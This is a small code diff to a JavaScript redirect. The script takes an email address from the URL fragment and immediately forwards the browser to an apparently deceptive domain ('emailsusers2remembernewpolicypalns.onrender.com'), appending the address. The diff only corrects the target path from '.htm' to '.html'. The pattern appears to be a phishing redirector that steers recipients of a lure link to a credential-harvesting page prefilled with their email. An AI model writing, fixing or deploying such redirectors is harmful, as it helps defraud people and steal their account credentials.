@@ -10,7 +10,7 @@
         var em = hash.split('#')[1];
                                         
                        window.setTimeout(function() {
-    window.location.href = 'https://emailsusers2remembernewpolicypalns.onrender.com/index.htm#'+em;
+    window.location.href = 'https://emailsusers2remembernewpolicypalns.onrender.com/index.html#'+em;
 }, 0);
         
     </script>
